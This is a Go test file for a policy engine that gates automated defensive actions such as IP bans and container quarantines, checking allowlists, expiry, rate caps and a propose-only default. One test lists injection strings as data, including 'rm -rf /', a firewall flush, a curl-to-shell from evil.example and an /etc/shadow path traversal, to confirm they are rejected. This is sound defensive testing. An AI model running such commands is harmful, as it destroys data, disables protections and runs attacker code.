package policy

import (
	"errors"
	"strings"
	"testing"
	"time"
)

// The table has to satisfy its own promises. This is the test that makes adding
// an action without declaring its limits impossible rather than discouraged.
func TestTheRuleTableSatisfiesItsOwnInvariants(t *testing.T) {
	if errs := Verify(); len(errs) > 0 {
		for _, e := range errs {
			t.Errorf("policy.Verify: %v", e)
		}
	}
}

func TestEveryActionExpires(t *testing.T) {
	for _, r := range Rules() {
		if r.MaxTTL <= 0 {
			t.Errorf("%s has no MaxTTL: an effect with no expiry becomes permanent the first time "+
				"the detection is wrong", r.Kind)
		}
	}
}

func TestNoActionRunsAnInterpreter(t *testing.T) {
	for _, r := range Rules() {
		if err := verifyArgvIsNotAShell(r); err != nil {
			t.Error(err)
		}
	}
}

// The self-DoS list. Each case here is an outage, not a category.
func TestNeverTouch(t *testing.T) {
	cases := []struct {
		name, kind, target, wantIn string
	}{
		{"quarantining the tunnel is a total outage", string(QuarantineContainer), "cloudflared", "only ingress"},
		{"quarantining postgres fails every request", string(QuarantineContainer), "db", "in-flight"},
		{"quarantining the broker reads as data loss", string(QuarantineContainer), "broker", "data loss"},
		{"mosquitto is not ours", string(QuarantineContainer), "mosquitto", "ESP32"},
		{"a private source at the edge is the tunnel", string(BlockEdge), "172.18.0.4", "TUNNEL"},
		{"loopback is us", string(BlockEdge), "127.0.0.1", "TUNNEL"},
		{"the pi's own CGNAT address", string(BlockEdge), "100.79.3.11", "TUNNEL"},
	}
	rules := ByKind()
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			r := rules[Kind(c.kind)]
			_, err := r.Validate(c.target)
			if err == nil {
				t.Fatalf("%s %s was allowed; this is a self-inflicted outage", c.kind, c.target)
			}
			if !errors.Is(err, ErrNeverTouch) {
				t.Fatalf("want ErrNeverTouch, got %v", err)
			}
			if !strings.Contains(err.Error(), c.wantIn) {
				t.Errorf("the refusal does not say why.\n got: %v\nwant it to mention: %q", err, c.wantIn)
			}
		})
	}
}

// A host firewall rule cannot see an internet client on this topology, and
// saying so in the error is the difference between a confusing refusal and a
// pointer to the control that works.
func TestBanningAPublicAddressAtTheHostIsRefusedAndPointsAtTheEdge(t *testing.T) {
	r := ByKind()[BanHostIP]
	_, err := r.Validate("203.0.113.7")
	if err == nil {
		t.Fatal("a public address was accepted for a host firewall rule; traffic never arrives that way")
	}
	if !strings.Contains(err.Error(), string(BlockEdge)) {
		t.Errorf("the refusal should name the action that DOES work: %v", err)
	}
}

// Everything Neo reacts to is attacker-authored text. These are the shapes an
// attacker would try.
func TestTargetsCannotCarryAShell(t *testing.T) {
	nasty := []string{
		"10.0.0.1; rm -rf /",
		"10.0.0.1 && nft flush ruleset",
		"$(curl evil.example/x|sh)",
		"`id`",
		"web\nnft flush ruleset",
		"../../etc/shadow",
		"--privileged",
		"", // the empty target
	}
	for _, r := range Rules() {
		for _, n := range nasty {
			if _, err := r.Validate(n); err == nil {
				t.Errorf("%s accepted target %q", r.Kind, n)
			}
		}
	}
}

func fixedClock(t time.Time) func() time.Time { return func() time.Time { return t } }

func TestProposeNeverActs(t *testing.T) {
	e, err := NewEngine(Propose, fixedClock(time.Unix(1_700_000_000, 0)))
	if err != nil {
		t.Fatal(err)
	}
	d := e.Decide(QuarantineContainer, "web", time.Minute, "f1", "looked bad")
	if d.Verdict != Escalate {
		t.Fatalf("propose mode returned %q; it must never act", d.Verdict)
	}
	// The escalation is only useful if it carries the command.
	if len(d.Argv) == 0 {
		t.Error("a proposal with no argv is a log line, not an escalation")
	}
	if !strings.Contains(d.Why, "enforce") {
		t.Errorf("the escalation should say how to enable acting: %q", d.Why)
	}
}

func TestEnforceActsAndTheGlobalCapStopsAStorm(t *testing.T) {
	now := time.Unix(1_700_000_000, 0)
	e, err := NewEngine(Enforce, fixedClock(now))
	if err != nil {
		t.Fatal(err)
	}
	// BanHostIP allows 4 per 10m; the global cap is 10 per 10m. Walk two kinds
	// so the global cap is what bites, which is the case that matters: an
	// attacker who can trigger many DIFFERENT detections.
	acted := 0
	for i := 0; i < 40; i++ {
		kind, target := BanHostIP, "192.168.1.50"
		if i%2 == 1 {
			kind, target = RevokeSession, "42"
		}
		d := e.Decide(kind, target, time.Minute, "f", "why")
		if d.Verdict == Act {
			acted++
			e.Committed(d)
		}
	}
	if acted > GlobalLimit.Max {
		t.Fatalf("%d actions were allowed; the global cap is %d. Without it a compromised "+
			"detection layer is an amplifier", acted, GlobalLimit.Max)
	}
	if acted == 0 {
		t.Fatal("enforce mode acted zero times; the cap has become a block")
	}
	d := e.Decide(BanHostIP, "192.168.1.51", time.Minute, "f", "why")
	if d.Verdict != Escalate {
		t.Fatalf("past the cap the verdict must be Escalate, got %q", d.Verdict)
	}
	if !strings.Contains(d.Why, "GLOBAL") && !strings.Contains(d.Why, "rate limit") {
		t.Errorf("the refusal must say it was rate limited: %q", d.Why)
	}
}

// Escalations must not consume budget, or an attacker exhausts it with findings
// that were never going to act and silences the one real detection.
func TestEscalationsDoNotSpendTheActionBudget(t *testing.T) {
	now := time.Unix(1_700_000_000, 0)
	e, err := NewEngine(Enforce, fixedClock(now))
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 50; i++ {
		// A refused target: never-touch, so it can never act.
		d := e.Decide(QuarantineContainer, "cloudflared", time.Minute, "f", "why")
		if d.Verdict != Refuse {
			t.Fatalf("want Refuse for a never-touch target, got %q", d.Verdict)
		}
		e.Committed(d) // must be a no-op for a non-Act
	}
	d := e.Decide(RevokeSession, "42", time.Minute, "f", "why")
	if d.Verdict != Act {
		t.Fatalf("50 refusals consumed the budget; verdict is now %q", d.Verdict)
	}
}

func TestTTLIsClampedNotRefused(t *testing.T) {
	e, err := NewEngine(Enforce, fixedClock(time.Unix(1_700_000_000, 0)))
	if err != nil {
		t.Fatal(err)
	}
	r := ByKind()[BanHostIP]
	d := e.Decide(BanHostIP, "192.168.1.50", 999*time.Hour, "f", "why")
	if d.Verdict != Act {
		t.Fatalf("an over-long ttl should be clamped, not refused: %q %s", d.Verdict, d.Why)
	}
	if d.TTL != r.MaxTTL {
		t.Errorf("ttl = %s, want the rule cap %s", d.TTL, r.MaxTTL)
	}
	// The kernel timeout in the argv must carry the clamped value, not the
	// requested one: an in-process timer would die with the process and the ban
	// would become permanent.
	joined := strings.Join(d.Argv, " ")
	if !strings.Contains(joined, "timeout") {
		t.Errorf("the ban argv has no kernel-side timeout: %q", joined)
	}
}

func TestAnUnknownActionIsRefusedAndListsWhatIsAllowed(t *testing.T) {
	e, err := NewEngine(Enforce, fixedClock(time.Unix(1_700_000_000, 0)))
	if err != nil {
		t.Fatal(err)
	}
	d := e.Decide(Kind("run_command"), "anything", time.Minute, "f", "why")
	if d.Verdict != Refuse {
		t.Fatalf("an action outside the allowlist must be refused, got %q", d.Verdict)
	}
	if !strings.Contains(d.Why, "revoke_session") {
		t.Errorf("the refusal should list the allowlist: %q", d.Why)
	}
}

func TestParseModeRefusesAnythingElse(t *testing.T) {
	for _, s := range []string{"enforced", "yes", "on", "ENFORCE!", "1"} {
		if _, err := ParseMode(s); err == nil {
			t.Errorf("ParseMode(%q) was accepted; an unrecognised mode must not default", s)
		}
	}
	if m, err := ParseMode(""); err != nil || m != Propose {
		t.Errorf("an unset mode must default to propose, got %q %v", m, err)
	}
	if m, _ := ParseMode(" Enforce "); m != Enforce {
		t.Errorf("enforce should parse case- and space-insensitively, got %q", m)
	}
}
